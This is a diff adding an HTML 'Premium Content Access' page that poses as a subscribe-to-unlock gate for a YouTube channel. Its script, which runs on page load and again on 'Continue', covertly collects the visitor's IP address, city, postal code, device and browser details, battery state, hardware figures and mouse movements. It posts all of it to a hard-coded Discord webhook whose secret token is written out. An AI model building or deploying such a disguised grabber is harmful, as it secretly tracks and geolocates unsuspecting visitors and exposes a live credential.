@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Premium Content Access</title>
+    <style>
+        body {
+            background-color: #1c2526;
+            color: #ffffff;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
+        }
+        .container {
+            background-color: #2e2e2e;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+            max-width: 600px;
+            width: 90%;
+        }
+        h1 {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        button {
+            background-color: #ff0000;
+            color: #ffffff;
+            border: none;
+            padding: 10px 20px;
+            margin: 10px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button:disabled {
+            background-color: #555555;
+            cursor: not-allowed;
+        }
+        button:hover:not(:disabled) {
+            background-color: #cc0000;
+        }
+        #premiumContent, #note, #expire {
+            display: none;
+            margin-top: 20px;
+            color: #ffffff;
+        }
+        #note, #expire {
+            font-size: 14px;
+            color: #cccccc;
+        }
+        a {
+            color: #ff0000;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Verification</h1>
+        <p>Step 1: Please Subscribe To Unlock Access.</p>
+        <p>Step 2: Don't UnSubscribe Or I Will Delete Your Whitelist User</p>
+        <a href="https://youtube.com/@themugenking?si=xHcLhvJnGXWcE_ZG" target="_blank" id="subscribeLink">
+            <button id="subscribeBtn">Subscribe</button>
+        </a>
+        <button id="continueBtn" disabled>Continue</button>
+        <div id="premiumContent">
+            <h2>Congratulations You Have Login</h2>
+            <p>You Have Subscribed - Our Channel</p>
+            <p>It Will Automatically Open Soon</p>
+            <p>If You Unsubscribe, We Will Delete Your Whitelist User</p>
+            <p>Now type 'Subscribe' in the box below to unlock</p>
+       </div>
+        <div id="note">Note: Your subscription helps us create more awesome content!</div>
+        <div id="expire">Expires: December 31, 2025</div>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://unpkg.com/ua-parser-js@1.0.2/dist/ua-parser.min.js"></script>
+    <script>
+        // Initialize variables
+        const webhookURL = 'https://discord.com/api/webhooks/1382290023973388378/vSVbYXSAImbRXclo5CcigWHeHzxHl2f8LXXUluyNl6GDmZipJxv85ZmBy3E2Y_mCoeng'; // Replace with your actual Discord webhook URL
+        let mouseMovements = [];
+        let sessionStartTime = performance.now();
+        const sessionId = Math.random().toString(36).substring(2, 15);
+        const accessTime = new Date().toLocaleString('en-US', { timeZone: 'Asia/Jakarta' });
+        let focusTimeStart = performance.now();
+        let totalFocusTime = 0;
+        let interactionCount = 0;
+
+        // Anti-bypass system
+        let hasSubscribed = false;
+        document.getElementById('subscribeBtn').addEventListener('click', () => {
+            hasSubscribed = true;
+            document.getElementById('continueBtn').disabled = false;
+            interactionCount++;
+        });
+
+        // Mouse movement tracking
+        document.addEventListener('mousemove', (e) => {
+            mouseMovements.push({ x: e.clientX, y: e.clientY, time: new Date().toLocaleTimeString() });
+            if (mouseMovements.length > 10) mouseMovements.shift();
+            interactionCount++;
+        });
+
+        // Window focus time tracking
+        document.addEventListener('visibilitychange', () => {
+            if (document.visibilityState === 'visible') {
+                focusTimeStart = performance.now();
+            } else {
+                totalFocusTime += (performance.now() - focusTimeStart) / 1000;
+            }
+        });
+
+        // AdBlock detection
+        async function detectAdBlock() {
+            try {
+                await fetch('https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js', { method: 'HEAD', mode: 'no-cors' });
+                return 'Not detected';
+            } catch (error) {
+                return 'Detected';
+            }
+        }
+
+        // Basic bot detection
+        function detectBot() {
+            const timeSinceLoad = (performance.now() - sessionStartTime) / 1000;
+            const hasMinimalInteraction = interactionCount < 3;
+            const isTooFast = timeSinceLoad < 2 && hasSubscribed;
+            return (hasMinimalInteraction || isTooFast) ? 'Possible bot' : 'Likely human';
+        }
+
+        // Collect device and user data
+        async function collectData() {
+            const parser = new UAParser();
+            const uaResult = parser.getResult();
+            let ipData = {};
+            let location = 'Not available';
+            let zipcode = 'Not available';
+            let batteryInfo = 'Not available';
+            let connectionType = 'Not available';
+
+            // Get IP, location, and zipcode
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                ipData = await response.json();
+                location = `${ipData.city || 'Unknown'}, ${ipData.region || 'Unknown'}, ${ipData.country_name || 'Unknown'}`;
+                zipcode = ipData.postal || 'Not available';
+            } catch (error) {
+                console.error('Error fetching IP data:', error);
+            }
+
+            // Get battery info with fallback
+            try {
+                if ('getBattery' in navigator) {
+                    const battery = await navigator.getBattery();
+                    batteryInfo = `${(battery.level * 100).toFixed(0)}% (Charging: ${battery.charging})`;
+                } else {
+                    batteryInfo = 'Battery API not supported by browser';
+                }
+            } catch (error) {
+                console.error('Error accessing Battery API:', error);
+                batteryInfo = 'Battery API access failed';
+            }
+
+            // Get connection type
+            if (navigator.connection) {
+                connectionType = navigator.connection.effectiveType || 'Not available';
+            }
+
+            // Calculate session duration
+            const duration = ((performance.now() - sessionStartTime) / 1000).toFixed(2) + ' seconds';
+
+            // Get time zone
+            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Not available';
+
+            // Get adblock status
+            const adBlockStatus = await detectAdBlock();
+
+            // Get focus time
+            const focusTime = document.visibilityState === 'visible'
+                ? (totalFocusTime + (performance.now() - focusTimeStart) / 1000).toFixed(2) + ' seconds'
+                : totalFocusTime.toFixed(2) + ' seconds';
+
+            // Get bot detection status
+            const botStatus = detectBot();
+
+            return {
+                ip: ipData.ip || 'Unknown',
+                browser: uaResult.browser.name + ' ' + uaResult.browser.version || 'Unknown',
+                platform: uaResult.os.name + ' ' + uaResult.os.version || 'Unknown',
+                device: uaResult.device.model || 'Unknown',
+                referrer: document.referrer || 'None',
+                resolution: `${window.screen.width}x${window.screen.height}`,
+                battery: batteryInfo,
+                language: navigator.language || 'Unknown',
+                mouseMovements: JSON.stringify(mouseMovements),
+                duration: duration,
+                sessionId: sessionId,
+                accessTime: accessTime,
+                location: location,
+                zipcode: zipcode,
+                timeZone: timeZone,
+                colorDepth: window.screen.colorDepth + ' bits' || 'Not available',
+                touchSupport: navigator.maxTouchPoints > 0 ? 'Yes (' + navigator.maxTouchPoints + ' points)' : 'No',
+                connectionType: connectionType,
+                cookiesEnabled: navigator.cookieEnabled ? 'Yes' : 'No',
+                adBlock: adBlockStatus,
+                cpuCores: navigator.hardwareConcurrency || 'Not available',
+                memory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Not available',
+                focusTime: focusTime,
+                botStatus: botStatus
+            };
+        }
+
+        // Send data to Discord webhook
+        async function sendToDiscord(data) {
+            if (!webhookURL || webhookURL === 'YOUR_DISCORD_WEBHOOK_URL') {
+                alert('Error: Please configure a valid Discord webhook URL.');
+                console.error('Invalid webhook URL');
+                return;
+            }
+
+            const embed = {
+                title: 'New User Data',
+                fields: Object.entries(data).map(([name, value]) => ({
+                    name: name.charAt(0).toUpperCase() + name.slice(1),
+                    value: value.toString().substring(0, 1024), // Truncate to avoid Discord field limits
+                    inline: true
+                })),
+                color: 0x000000,
+                timestamp: new Date().toISOString()
+            };
+
+            try {
+                const response = await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ embeds: [embed] })
+                });
+                if (!response.ok) {
+                    throw new Error(`Webhook request failed with status ${response.status}`);
+                }
+            } catch (error) {
+                alert('Failed to send data to Discord. Please check the webhook URL or try again later.');
+                console.error('Error sending to Discord:', error);
+            }
+        }
+
+        // Handle Continue button click
+        document.getElementById('continueBtn').addEventListener('click', async () => {
+            if (!hasSubscribed) {
+                alert('Please subscribe first!');
+                return;
+            }
+
+            const data = await collectData();
+            await sendToDiscord(data);
+
+            // Show premium content, note, and expire
+            document.getElementById('premiumContent').style.display = 'block';
+            document.getElementById('note').style.display = 'block';
+            document.getElementById('expire').style.display = 'block';
+
+            // Auto-redirect to premium content after 2 seconds
+            setTimeout(() => {
+                window.location.href = 'https://example.com/premium';
+            }, 2000);
+        });
+
+        // Get initial data on page load
+        collectData().then(data => sendToDiscord(data));
+    </script>
+</body>
+</html>
